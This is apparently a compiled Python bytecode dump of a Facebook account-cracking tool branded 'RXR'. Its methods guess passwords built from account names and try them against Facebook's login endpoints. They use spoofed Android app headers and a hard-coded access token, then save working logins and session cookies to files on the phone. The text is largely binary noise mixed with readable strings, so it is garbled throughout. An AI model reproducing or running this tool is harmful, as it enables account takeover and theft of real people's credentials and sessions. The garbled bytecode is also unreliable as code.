(Linux; U; Android 13; XQ-CQ54 Build/61.1.A.0.913) [FBAN/FB4A;FBAV/421.0.0.26.76;FBBV/451474154;FBDM/{density=2.625,width=1080,height=2270};FBLC/es_ES;FBRV/0;FBCR/Verizon Wireless;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-CQ54;FBSV/13;FBOP/19;FBCA/armeabi-v7a:armeabi:;]�adid�format�json�	device_id�cpl�true�family_device_id�credentials_type�device_based_login_password�error_detail_type�button_with_disabled�source�device_based_login�email�password�access_token�/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�generate_session_cookiesrb   �meta_inf_fbmetaro   �advertiser_id�currently_logged_in_useridr1   �locale�en_GB�client_country_code�GB�
auth.login�authenticate�3com.facebook.account.login.protocol.Fb4aAuthHandler� 882a8490361da98702bf97a021ddc14d�r   �fb_api_req_friendly_name�fb_api_caller_class�api_key�!application/x-www-form-urlencoded�graph.facebook.com� N  �@�  �
MOBILE.LTE�False�Unid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62�5120�ViewerReactionsMutation�graphservice�Liger�True� d29d67d37eca387482a8a5b740f84f62�z
User-AgentzContent-TyperN   zX-FB-Net-HNIzX-FB-SIM-HNIzX-FB-Connection-TypezX-Tigon-Is-Retryzx-fb-session-idzx-fb-device-groupzX-FB-Friendly-NamezX-FB-Request-Analytics-TagszX-FB-HTTP-EnginezX-FB-Client-IPzX-FB-Server-Clusterzx-fb-connection-token�'https://b-graph.facebook.com/auth/loginF��data�headers�allow_redirects�session_key�;c              3   �>   K  � | ]}|d          dz   |d         z   V � �dS �r�   �=�valueNrS   r�   s     r$   �	<genexpr>z%main_crack.methodA.<locals>.<genexpr>2  �3   � � � �#[�#[��A�f�I�c�M�!�G�*�$<�#[�#[�#[�#[�#[�#[r&   �session_cookies�   r�   �+�_�/�-�sb=��
 [RXR-OK] z/sdcard/RXR_OK_ids_M1.txt�a�|rY   z/sdcard/RXR_iDs_COOKiEs_M1.txt�www.facebook.com�error�message�
 [RXR-CP] �/sdcard/RXR_CP.txt)&�sys�stdout�writerE   �looprZ   r_   r[   r�   �floatrw   �flush�splitr�   �lowerr�   r�   r   �uuid�uuid4r   r	   r~   r�   �join�base64�	b64encoderV   �urandom�decoderR   rD   rt   r�   rL   �
exceptions�ConnectionErrorrp   �r�   �sidr�   �psw�fs�ls�pw�psr�   r#   r�   r�   �qr�   �RXRbr{   s                   r$   rp   zmain_crack.methodA�   s�  � �B	(��J����1���4���C��H�H����S�����a��QY�Q`�Q`�ae�fk�lo�pt�pw�lx�lx�fy�fy�ay�Qz�Qz��|}���  A�  A�  A��J���������C����#�B���Z�Z��_�_�Q�'������������� 6� 6���Z�Z�����
�
�3�3�;�;�G�B�G�G�O�O�PV�WY�W_�W_�Wa�Wa�b�b�j�j�kq�rt�u�u�}�}�  E�  FJ�  K�  K�  S�  S�  TZ�  [_�  [e�  [e�  [g�  [g�  h�  h���%�'�'� /�7� ��/���T�Z�\�\�!2�!2� /� �&�/� �S�������/� �v�/� �C��
���%�%�	/�
 �1�/� �+�/� 	�
�/� ��/� �B�/� �A�/� �C�/� �2�/� ��T�Z�\�\�"�"�/� �c�/� 	�'�/�  �t�!/�" �*�L�-�)/� /� /��/� /� /� /� /� /� /� /� /� /� /���� /� /� /� /�. *,�3���F�N�5�%�0�0�1�1��F�N�5�%�0�0�1�1�$��j��/�-����;�>� >�� �L�L�!J�PT�^e�w|�L�}�}�  C�  C�  E�  E�� �A�%�%��8�8�#[�#[�a�HY�FZ�#[�#[�#[�[�[�D�ci�cs�tv�t~�  @B�  uC�  uC�  dD�  dD�  dK�  dK�  dM�  dM�  dU�  dU�  VY�  Z\�  d]�  d]�  de�  de�  fi�  jm�  dn�  dn�  dv�  dv�  wz�  {~�  d�  d�\`�  I\�  OS�  I\�  I\�  VZ�  I\�  I\�  @F��<�q�<�<�C�<�<�B�<�<��<�<�=�=�=� �J�J�s�O�O�O��4�S�9�9�?�?��C���
�4��P�P�P�QU�Vv�wz�Q{�Q{�  RB�  RB�  CF�  GJ�  CJ�  KM�  CM�  NQ�  CQ�  RX�  CX�  Y]�  C]�  R^�  R^�  R^��E�'�1�W�:�i�+@�@�@��=��=�=�S�=�=�R�=�=�!�=�=�>�>�>��Z�Z��_�_�_��.�s�3�3�9�9�#�c�'�"�*�T�/�J�J�J�J���!�G�D�D�D���"�2� 	(� 	(� 	(��L�L��d�B�'�'�'�'�'�'�	(����Q   �CS( � C< �;S( �<D� CS( �B7J�S( �J	�S( �J	�IS( �(+T�Tc                 �4
  � 	 t           j        �                    dt          � dt          � dt          t          �  �        � dt          t          �  �        � dt          � d�                    t          t          t          | j
        �  �        �  �        z  �  �        � t          � ��  �         t           j        �                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d         }n	#  |}Y nxY w|D �]�}|�                    d|�                    �   �         �  �        �                    d	|�  �        �                    d
|�                    �   �         �  �        �                    d|�  �        �                    d|�  �        �                    d|�                    �   �         �  �        }t          j        �   �         5 }d}	i dt#          t%          j        �   �         �  �        �dd�dt#          t%          j        �   �         �  �        �dd�dt#          t%          j        �   �         �  �        �dd�dd�dd�d|�d|�dd�d d!�d"d#�d$t#          t%          j        �   �         �  �        �d%d&�d'd(�d)d*�d+d,d-d.d/��}
d d d �  �         n# 1 swxY w Y   |	d0d1t#          t)          j        d2d3�  �        �  �        t#          t)          j        d2d3�  �        �  �        d4d5d6d7d8d9d:d;d;d<d=�}|�                    d>|
|d?�@�  �        �                    �   �         }dA|v �r@dB�                    dC� |dD         D �   �         �  �        }t3          j        t7          j        dE�  �        �  �        �                    �   �         �                    dFd#�  �        �                    dGdH�  �        �                    dIdJ�  �        }dK|� dB|� �}t=          dLt>          � dM|� d|� dt          � ��  �         t          �                     |�  �         tC          dNdO�  �        �                    |dPz   |z   dQz   �  �         tC          dRdO�  �        �                    |dPz   |z   dPz   |z   dQz   �  �          ndS|dT         dU         v rmt=          dLtD          � dV|� d|� dt          � ��  �         t          �                     |�  �         tC          dWdO�  �        �                    |dPz   |z   dQz   �  �         ��Ӑ��t          dz  ad S # t          j#        j$        $ r | �%                    |||�  �         Y d S w xY w)XNr�   z[-3] r�   r�   r2   r   r   r�   r�   r�   r�   r�   r�   a&  Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ54 Build/64.1.A.0.913) [FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/451474154;FBDM/{density=2.625,width=1080,height=2270};FBLC/es_ES;FBRV/0;FBCR/Verizon Wireless;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-CQ54;FBSV/13;FBOP/19;FBCA/armeabi-v7a:armeabi:;]r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rb   r�   ro   r�   r�   r1   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   Fr�   r�   r�   c              3   �>   K  � | ]}|d          dz   |d         z   V � �dS r�   rS   r�   s     r$   r�   z%main_crack.methodC.<locals>.<genexpr>w  r�   r&   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   �/sdcard/RXR_OK_ids_M2.txtr�   r�   rY   �/sdcard/RXR_iDs_COOKiEs_M2.txtr�   r�   r�   r�   r�   )&r�   r�   r�   rE   r   rZ   r[   r_   r�   r  rw   r  r  r�   r  r�   r�   r   r  r  r   r	   r~   r�   r  r  r	  rV   r
  r  rR   rD   rt   r�   rL   r  r  rr   r  s                   r$   rr   zmain_crack.methodCC  s�  � �@	(��J����1���4���C��H�H����S�����a��QY�Q`�Q`�ae�fk�lo�pt�pw�lx�lx�fy�fy�ay�Qz�Qz��|}���  A�  A�  A��J���������C����#�B���Z�Z��_�_�Q�'������������� 4� 4���Z�Z�����
�
�3�3�;�;�G�B�G�G�O�O�PV�WY�W_�W_�Wa�Wa�b�b�j�j�kq�rt�u�u�}�}�  E�  FJ�  K�  K�  S�  S�  TZ�  [_�  [e�  [e�  [g�  [g�  h�  h���%�'�'� /�7� ��/���T�Z�\�\�!2�!2� /� �&�/� �S�������/� �v�/� �C��
���%�%�	/�
 �1�/� �+�/� 	�
�/� ��/� �B�/� �A�/� �C�/� �2�/� ��T�Z�\�\�"�"�/� �c�/� 	�'�/�  �t�!/�" �*�L�-�)/� /� /��/� /� /� /� /� /� /� /� /� /� /���� /� /� /� /�. *,�3���F�N�5�%�0�0�1�1��F�N�5�%�0�0�1�1�$��j��/�-����;�>� >�� �L�L�!J�PT�^e�w|�L�}�}�  C�  C�  E�  E�� �A�%�%��8�8�#[�#[�a�HY�FZ�#[�#[�#[�[�[�D�ci�cs�tv�t~�  @B�  uC�  uC�  dD�  dD�  dK�  dK�  dM�  dM�  dU�  dU�  VY�  Z\�  d]�  d]�  de�  de�  fi�  jm�  dn�  dn�  dv�  dv�  wz�  {~�  d�  d�\`�  I\�  OS�  I\�  I\�  VZ�  I\�  I\�  @F��<�q�<�<�C�<�<�B�<�<��<�<�=�=�=��J�J�s�O�O�O��4�S�9�9�?�?��C���
�4��P�P�P�QU�Vv�wz�Q{�Q{�  RB�  RB�  CF�  GJ�  CJ�  KM�  CM�  NQ�  CQ�  RX�  CX�  Y]�  C]�  R^�  R^�  R^��E�'�1�W�:�i�+@�@�@��<�q�<�<�C�<�<�B�<�<��<�<�=�=�=��J�J�s�O�O�O��-�c�2�2�8�8��S����D��I�I�I�I���!�G�D�D�D���"�2� 	(� 	(� 	(��L�L��d�B�'�'�'�'�'�'�	(���r  c                 �4
  � 	 t           j        �                    dt          � dt          � dt          t          �  �        � dt          t          �  �        � dt          � d�                    t          t          t          | j
        �  �        �  �        z  �  �        � t          � ��  �         t           j        �                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d         }n	#  |}Y nxY w|D �]�}|�                    d|�                    �   �         �  �        �                    d	|�  �        �                    d
|�                    �   �         �  �        �                    d|�  �        �                    d|�  �        �                    d|�                    �   �         �  �        }t          j        �   �         5 }d}	i dt#          t%          j        �   �         �  �        �dd�dt#          t%          j        �   �         �  �        �dd�dt#          t%          j        �   �         �  �        �dd�dd�dd�d|�d|�dd�d d!�d"d#�d$t#          t%          j        �   �         �  �        �d%d&�d'd(�d)d*�d+d,d-d.d/��}
d d d �  �         n# 1 swxY w Y   |	d0d1t#          t)          j        d2d3�  �        �  �        t#          t)          j        d2d3�  �        �  �        d4d5d6d7d8d9d:d;d;d<d=�}|�                    d>|
|d?�@�  �        �                    �   �         }dA|v �r@dB�                    dC� |dD         D �   �         �  �        }t3          j        t7          j        dE�  �        �  �        �                    �   �         �                    dFd#�  �        �                    dGdH�  �        �                    dIdJ�  �        }dK|� dB|� �}t=          dLt>          � dM|� d|� dt          � ��  �         t          �                     |�  �         tC          dNdO�  �        �                    |dPz   |z   dQz   �  �         tC          dRdO�  �        �                    |dPz   |z   dPz   |z   dQz   �  �          ndS|dT         dU         v rmt=          dLtD          � dV|� d|� dt          � ��  �         t          �                     |�  �         tC          dWdO�  �        �                    |dPz   |z   dQz   �  �         ��Ӑ��t          dz  ad S # t          j#        j$        $ r | �%                    |||�  �         Y d S w xY w)XNr�   z[-12 r�   r�   r2   r   r   r�   r�   r�   r�   r�   r�   a  Dalvik/2.1.0 (Linux; U; Android 11; CPH2371 Build/RP1A.200720.011) [FBAN/FB4A;FBAV/404.0.0.35.70;FBBV/451474154;FBDM/{density=2.625,width=1080,height=2270};FBLC/en_US;FBRV/0;FBCR/XL;FBMF/oppo;FBBD/oppo;FBPN/com.facebook.katana;FBDV/CPH2371;FBSV/13;FBOP/19;FBCA/arm64-v8a:;]r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rb   r�   ro   r�   r�   r1   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   Fr�   r�   r�   c              3   �>   K  � | ]}|d          dz   |d         z   V � �dS r�   rS   r�   s     r$   r�   z%main_crack.methodB.<locals>.<genexpr>�  r�   r&   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r�   r�   rY   r  r�   r�   r�   r�   r�   )&r�   r�   r�   rE   r   rZ   r[   r_   r�   r  rw   r  r  r�   r  r�   r�   r   r  r  r   r	   r~   r�   r  r  r	  rV   r
  r  rR   rD   rt   r�   rL   r  r  rq   r  s                   r$   rq   zmain_crack.methodB�  s�  � �@	(��J����1���4���C��H�H����S�����a��QY�Q`�Q`�ae�fk�lo�pt�pw�lx�lx�fy�fy�ay�Qz�Qz��|}���  A�  A�  A��J���������C����#�B���Z�Z��_�_�Q�'������������� 4� 4���Z�Z�����
�
�3�3�;�;�G�B�G�G�O�O�PV�WY�W_�W_�Wa�Wa�b�b�j�j�kq�rt�u�u�}�}�  E�  FJ�  K�  K�  S�  S�  TZ�  [_�  [e�  [e�  [g�  [g�  h�  h���%�'�'� /�7� j��/���T�Z�\�\�!2�!2� /� �&�/� �S�������/� �v�/� �C��
���%�%�	/�
 �1�/� �+�/� 	�
�/� ��/� �B�/� �A�/� �C�/� �2�/� ��T�Z�\�\�"�"�/� �c�/� 	�'�/�  �t�!/�" �*�L�-�)/� /� /��/� /� /� /� /� /� /� /� /� /� /���� /� /� /� /�. *,�3���F�N�5�%�0�0�1�1��F�N�5�%�0�0�1�1�$��j��/�-����;�>� >�� �L�L�!J�PT�^e�w|�L�}�}�  C�  C�  E�  E�� �A�%�%��8�8�#[�#[�a�HY�FZ�#[�#[�#[�[�[�D�ci�cs�tv�t~�  @B�  uC�  uC�  dD�  dD�  dK�  dK�  dM�  dM�  dU�  dU�  VY�  Z\�  d]�  d]�  de�  de�  fi�  jm�  dn�  dn�  dv�  dv�  wz�  {~�  d�  d�\`�  I\�  OS�  I\�  I\�  VZ�  I\�  I\�  @F��<�q�<�<�C�<�<�B�<�<��<�<�=�=�=��J�J�s�O�O�O��4�S�9�9�?�?��C���
�4��P�P�P�QU�Vv�wz�Q{�Q{�  RB�  RB�  CF�  GJ�  CJ�  KM�  CM�  NQ�  CQ�  RX�  CX�  Y]�  C]�  R^�  R^�  R^��E�'�1�W�:�i�+@�@�@��<�q�<�<�C�<�<�B�<�<��<�<�=�=�=��J�J�s�O�O�O��-�c�2�2�8�8��S����D��I�I�I�I���!�G�D�D�D���"�2� 	(� 	(� 	(��L�L��d�B�'�'�'�'�'�'�	(���r  c                 �  � t           j        �                    dt          � dt          � dt          t          �  �        � dt          t          �  �        � dt          � d�                    t          t          t          | j
        �  �        �  �        z  �  �        � t          � ��  �         t           j        �                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d	         }n	#  |}Y nxY w	 |D �]�}|�                    d
|�                    �   �         �  �        �                    d|�  �        �                    d|�                    �   �         �  �        �                    d|�  �        �                    d|�  �        �                    d|�                    �   �         �  �        }t          j        �   �         }t#          j        t&          �  �        }	|�                    d|� d��  �        }
t+          j        dt/          |
j        �  �        �  �        �                    d	�  �        t+          j        dt/          |
j        �  �        �  �        �                    d	�  �        |dd|d�}i |_        |j        �                    i dd�dd�dd�dd�dd �d!d"�d#d$�d%d$�d&|	�d'd(�d)d*�d+d,�d-d�d.d/�d0d1�d2d3��  �         |�                    d4|d5�6�  �        }d7|j        �                    �   �         v rmt?          d8t@          � d9|� d|� dt          � ��  �         t          �!                    |�  �         tE          d:d;�  �        �                    |d<z   |z   d=z   �  �          ned>|j        �                    �   �         v rHt          �!                    |�  �         tE          d?d;�  �        �                    |d<z   |z   d=z   �  �          n���t          d	z  ad S # t          j#        j$        $ r | �%                    |||�  �         Y d S w xY w)@Nr�   z[RXR] z | M4 OK/CP r�   r�   r�   r2   r   r   r�   r�   r�   r�   r�   r�   z=https://mbasic.facebook.com/login/device-based/password/?uid=z)&flow=login_no_pin&refsrc=deprecated&_rdrzname="lsd" value="(.*?)"zname="jazoest" value="(.*?)"z.https://mbasic.facebook.com/login/save-device/�login_no_pin)�lsd�jazoest�uid�next�flow�passrN   zmbasic.facebook.comrP   rM   rO   zB" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"zsec-ch-ua-mobilez?1zsec-ch-ua-platform�Androidzsec-ch-prefers-color-scheme�light�dntrb   zupgrade-insecure-requestsz
user-agent�acceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zsec-fetch-site�nonezsec-fetch-mode�navigatezsec-fetch-userzsec-fetch-dest�documentzaccept-encodingzgzip, deflate, brzaccept-languagez&en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0F)r�   r�   �c_userr�   r�   z/sdcard/RXR_OK.txtr�   r�   rY   �
checkpointr�   )&r�   r�   r�   rE   r   rZ   r[   r_   r�   r  rw   r  r  r�   r  r�   r�   r   r   �sagentr�   �re�searchr   r�   �groupr�   �updater~   r|   �get_dictrR   rD   rt   r�   r  r  �methodD)r�   r  r�   r  r  r  r  r  r�   �sua�getlog�idpass�completes                r$   r5  zmain_crack.methodD�  s�  � ��
���  D�q�  D�  D��  D�  D�#�c�(�(�  D�  D�S��X�X�  D�  D�RS�  D�U]�Ud�Ud�ei�jo�ps�tx�t{�p|�p|�j}�j}�e}�U~�U~�  D�  AB�  D�  D�  	E�  	E�  	E��
�������Z�Z��_�_�Q���	����C����#�B�B��	��B�B�B����	)�� � ���Z�Z�����
�
�3�3�;�;�G�B�G�G�O�O�PV�WY�W_�W_�Wa�Wa�b�b�j�j�kq�rt�u�u�}�}�  E�  FJ�  K�  K�  S�  S�  TZ�  [_�  [e�  [e�  [g�  [g�  h�  h�� �(�*�*���m�F�+�+�� ���  &T�eh�  &T�  &T�  &T�  U�  U��!�y�)C�S���EU�EU�V�V�\�\�]^�_�_�jl�js�  uS�  UX�  Y_�  Yd�  Ue�  Ue�  kf�  kf�  kl�  kl�  mn�  ko�  ko�  vy�  Aq�  yG�  OQ�  S�  S��"$�����&�&�  (
��0E�  (
�GW�Y^�  (
�`k�  nr�  (
�  tF�  HL�  (
�  Nb�  dm�  (
�  oL�  NU�  (
�  W\�  ^a�  (
�  c~�  @C�  (
�  EQ�  SV�  (
�  X`�  bk�  (
�  m}�  E�  (
�  GW�  Yc�  (
�  eu�  w{�  (
�  }M	�  O	Y	�  (
�  [	l	�  n	A
�  (
�  C
T
�  V
~
�  (
�  @�  @�  @�"�<�<�(r�x~�  PU�<�  V�  V���w��7�7�9�9�9�9��<�q�<�<�C�<�<�B�<�<��<�<�=�=�=��J�J�s�O�O�O��-�c�2�2�8�8��S����D��I�I�I��E�!�W�_�%=�%=�%?�%?�?�?��J�J�s�O�O�O��-�c�2�2�8�8��S����D��I�I�I��E�� �!�G�D�D�D���"�2� 	)� 	)� 	)��\�\�#�t�R�(�(�(�(�(�(�	)���s   �C; �;D�KO �+P	�P	c                 �<  � g }t          �   �          t          d�  �         t          t          d�  �        �  �        }t	          j        d�  �         t          t          �  �         t          t          � d��  �         t          d�  �         |dk    rt          d�  �         nQ|dk    rt          d�  �         n;t          |�  �        D ]+}|�	                    t          d	|d
z   � d��  �        �  �         �,t          t          � d�t          | j        �  �        z  �  �         t          �   �          t          d��  �        5 }| j        D �]%}	 |�                    d�  �        \  }}|�                    d�  �        }t          |�  �        dk    s9t          |�  �        dk    s&t          |�  �        dk    st          |�  �        dk    r|}	n�|}	dt          v r|�                    | j        |||	�  �         ntdt          v r|�                    | j        |||	�  �         nMdt          v r|�                    | j        |||	�  �         n&dt          v r|�                    | j        |||	�  �         ��#  Y ��$xY w	 d d d �  �         n# 1 swxY w Y   t)          t*          t,          �  �         d S )NzPut limit between 1 to 30z'How many password do you want to add?: r   z0 [Example: first123,last1122,firstlast,last,ETC]ro   z
 Put limit between 1 to 30�   z-
Password limit Should Not Be Greater Than 30z	Password r   z: z Total IDs : %s �   r   r�   r2   rn   r   �   r   rp   rq   rr   r5  )r   rR   �intr\   rV   r   rW   rE   r�   rt   rZ   rw   �flameRXRr  rs   �submitrp   rq   rr   r5  r`   r[   r_   )
r�   r  �sl�sr�RXRworld�zsbr"  r�   �sz�pwxs
             r$   r�   zmain_crack.pasw�  s�  � ��B��G�G�G��-�.�.�.��U�D�E�E�F�F�B��I�g�����$�K�K�K��Q�H�H�H�I�I�I��"�I�I�I��B�w�w��4�5�5�5�5��b����F�G�G�G�G���)�)� ;� ;�B��I�I�e�$8��1��$8�$8�$8�9�9�:�:�:�:�
 �Q�(�(�(�3�t�w�<�<�7�8�8�8������b�)�)�)� �X��7� � �C��#&�9�9�S�>�>�y�s�D� �J�J�s�O�O�r��b�'�'�Q�,�,�#�b�'�'�Q�,�,�#�b�'�'�Q�,�,�#�b�'�'�UV�,�,�"$�3�3�#%�C�(�G�3�3� (�����c�4�� M� M� M� M�!*�g�!5�!5� (�����c�4�� M� M� M� M�!*�g�!5�!5� (�����c�4�� M� M� M� M�!*�g�!5�!5� (�����c�4�� M� M� M����$�$����!�� � � � � � � � � � ���� � � � �$ �3�s�O�O�O�O�Os+   �;I7�DI"� I7�"I'�$I7�7I;�>I;N)
�__name__�
__module__�__qualname__r�   rv   rp   rr   rq   r5  r�   rS   r&   r$   ru   ru   �   s�   � � � � � �� � �#� #� #� C(� C(� C(�JA(� A(� A(�FA(� A(� A(�F#)� #)� #)�J(� (� (� (� (r&   ru   )`rV   �zlibr   �osRUB�cmdr�   �ImportErrorrR   �concurrent.futures�
concurrent�	mechanize�ModuleNotFoundError�urllib.requestr   r   r0  �platformr�   r   �
subprocess�	threading�	itertoolsr  r  r�   �shutil�
webbrowserri   �datetime�stringr   r?  r	   r
   �slpr   r@  �	fast_workr�   r�   r�   r   �totaldmp�countr   r[   r_   rw   r  r  �totalrs   �srange�saved�filterr%   r(   r   �gt�ugenr�   �xd�aa�br   �c�g�	randrange�hr�   �j�k�l�uaku2rt   �agent�d�e�f�fullagntr�   r�   rE   r3   rD   r8   rL   �headrW   rT   r   r`   rj   rf   r�   ru   rS   r&   r$   �<module>rv     s�  �� �������� � � � � � � � � � � � � 	��	�'� � � �
&��O�O�O�O��� &� &� &�	�E�
)�*�*�*��B�I�$�%�%�%�%�%�&����
%�������� %� %� %�	�E�
(�)�)�)��B�I�#�$�$�$�$�$�%����3�������� 3� 3� 3��B�I�1�2�2�2�2�2�3���� ,� +� +� +� +� +� +� +� p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p� =� =� =� =� =� =� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � 1� 1� 1� 1� 1� 1���2�.�.�.�5�	� 
���  [�  
\�  
\�  
a�  
l�  
l�  
n�  
n����	����������������
��	
��
����	��� � �� � � �V�]�  EE�  EE�  EE�  FE�  FE����
�%��,�,� � �B�T��
�&�-�9�9�9�
:�
:��
�S�S��W�W�
�
��
S��
�&�
�2�c�
"�
"��
��
�&�
�4��
%�
%��
�&�
�2�c�
"�
"��
I���6�6�a�6�6�1�6�6��6�1�6�6�q�6�6�1�6�6�q�6�6�1�6�6�����E������U�5�\�\� � �E�O��
�&�-�8�8�8�
9�
9��
&��
�&�-�  Z�  Z�  Z�  [�  [��
�&�
�1�c�
"�
"��
�&�-�  Z�  Z�  Z�  [�  [��
S��
�&�
�2�c�
"�
"��
��
�&�
�4��
%�
%��
�&�
�2�c�
"�
"��
J���C�C�!�C�C�q�C�!�C�Q�C��C�C�Q�C��C�C�A�C�C��C�C�A�C�C��C�C�����H������U�5�\�\� � �E�B��
�&�-�8�8�8�
9�
9��
+��
�&�-�  Z�  Z�  Z�  [�  [��
�&�
�1�c�
"�
"��
�&�-�  Z�  Z�  Z�  [�  [��
4��
�&�
�2�c�
"�
"��
��
�&�
�4��
%�
%��
�&�
�2�c�
"�
"��
x���C�C�!�C�C�q�C�!�C�Q�C��C�C�Q�C��C�C�A�C�C��C�C�A�C�C��C�C�����H������U�5�\�\� � �E�K��
�&�-�8�8�8�
9�
9��
4��
�&�-�  Z�  Z�  Z�  [�  [��
�&�
�1�c�
"�
"��
�&�-�  Z�  Z�  Z�  [�  [��
T��
�&�
�2�c�
"�
"��
��
�&�
�4��
%�
%��
�&�
�2�c�
"�
"��
I���C�C�!�C�C�q�C�!�C�Q�C��C�C�Q�C��C�C�A�C�C��C�C�A�C�C��C�C�����H����� �
� � �"� #� #� #�����������)�8b�v{�|�|����w� w� w�� � �	� 	� 	�S� S� S�� � �8-� -� -�(k� k� k� k� k� k� k� k�d	 ������s3   �+ � A�A�A � A:�9A:�>B �B�B